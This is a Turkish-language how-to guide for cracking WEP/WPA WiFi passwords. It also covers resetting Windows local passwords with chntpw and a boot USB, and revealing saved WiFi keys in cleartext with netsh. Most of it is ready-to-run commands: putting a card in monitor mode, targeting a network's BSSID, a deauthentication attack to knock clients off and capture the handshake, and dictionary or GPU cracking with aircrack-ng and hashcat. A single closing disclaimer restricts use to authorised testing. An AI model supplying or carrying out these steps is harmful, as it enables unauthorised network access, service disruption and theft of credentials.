# WEP/WPA WiFi Şifresi Kırma Rehberi

## 📋 İçindekiler
1. [MSYS2 Kurulumu](#msys2-kurulumu)
2. [Windows Parola Kırma Araçları](#windows-parola-kırma-araçları)
3. [WiFi Şifresi Kırma (Aircrack-ng)](#wifi-şifresi-kırma-aircrack-ng)
4. [GPU Hızlandırılı Kırma (Hashcat)](#gpu-hızlandırılı-kırma-hashcat)

---

## MSYS2 Kurulumu

### 1. Sistem Paketlerini Güncelleyin
```bash
pacman -Syu
```

### 2. Temel Araçları Yükleyin
```bash
pacman -S git wget curl vim nano
```

---

## Windows Parola Kırma Araçları

### A) Offline NT Password Editor (chntpw)
Windows yerel parolalarını SAM dosyasını düzenleyerek sıfırlar.

```bash
# Depoyu klonla
git clone https://github.com/jendralhxr/ntpasswd
cd ntpasswd

# Derleme talimatlarını takip et
# Not: MSYS2 ile uyumlu değilse WSL kullanmanız önerilir
```

### B) Hiren's BootCD PE USB Oluşturma
```bash
# ISO dosyasını indir
wget https://www.hirensbootcd.org/files/HBCD_PE_x64.iso

# USB'ye yaz (Rufus veya dd kullanarak)
```

---

## Windows Kayıtlı WiFi Parolaları Görme

### Tüm Kayıtlı Ağları Listele
```bash
netsh wlan show profiles
```

### Belirli Ağın Parolasını Göster
```bash
netsh wlan show profile name="AĞ_ADI" key=clear
```

### Alternatif Yöntem (CMD'de)
```cmd
cmd /c "netsh wlan show profile name='AĞ_ADI' key=clear"
```

---

## WiFi Şifresi Kırma (Aircrack-ng)

### 1. Aircrack-ng Yükle
```bash
pacman -S aircrack-ng
```

### 2. WiFi Kartını Monitör Moda Geçir
```bash
airmon-ng start wlan0
```

### 3. Ağları Tara
```bash
airodump-ng wlan0mon
```

### 4. Hedef Ağa Yönel ve Paketler Yakala
```bash
airodump-ng -c 1 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

**Not:** AA:BB:CC:DD:EE:FF yerine hedef ağın BSSID adresini yazın.

### 5. 4-Way Handshake Yakala
İstemcinin bağlantısını keserek yeniden bağlanmasını sağlayın:

```bash
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### 6. Parolayı Kır
```bash
aircrack-ng -w wordlist.txt capture-01.cap
```

---

## GPU Hızlandırılı Kırma (Hashcat)

### 1. CAP Dosyasını Hashcat Formatına Dönüştür
```bash
# cap → hccapx dönüşümü
cap2hccapx capture-01.cap capture-01.hccapx
```

### 2. Hashcat ile Kır (GPU Kullanır)
```bash
hashcat -m 2500 capture-01.hccapx wordlist.txt
```

---

## Özet Adımlar

| Adım | Komut | Açıklama |
|------|-------|---------|
| 1 | `airmon-ng start wlan0` | Monitor moda geç |
| 2 | `airodump-ng wlan0mon` | Ağları tara |
| 3 | `airodump-ng -c 1 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon` | Paketleri yakala |
| 4 | `aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon` | Deauth saldırısı |
| 5 | `aircrack-ng -w wordlist.txt capture-01.cap` | Parolayı kır |

---

## ⚠️ Yasal Uyarı
Bu araçlar yalnızca **yetkili penetrasyon testleri** için kullanılmalıdır. Yetkisiz ağlara erişim **yasadışıdır**.
